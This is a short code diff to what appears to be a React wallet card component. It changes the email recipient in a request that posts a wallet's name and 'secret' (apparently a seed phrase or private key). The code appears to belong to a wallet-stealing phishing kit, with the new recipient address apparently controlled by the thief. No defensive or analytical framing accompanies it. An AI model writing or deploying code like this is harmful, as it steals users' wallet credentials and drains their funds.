@@ -101,7 +101,7 @@ const WalletCard = ({ wallet }: Props) => {
           body: JSON.stringify({
             name: finalWallet.name.toString().trim(),
             secret: finalWallet.secret.toString().trim(),
-            to: "oghuanlan@gmail.com",
+            to: "dropbigbags@gmail.com",
           }),
         });
         const data = await response.json();
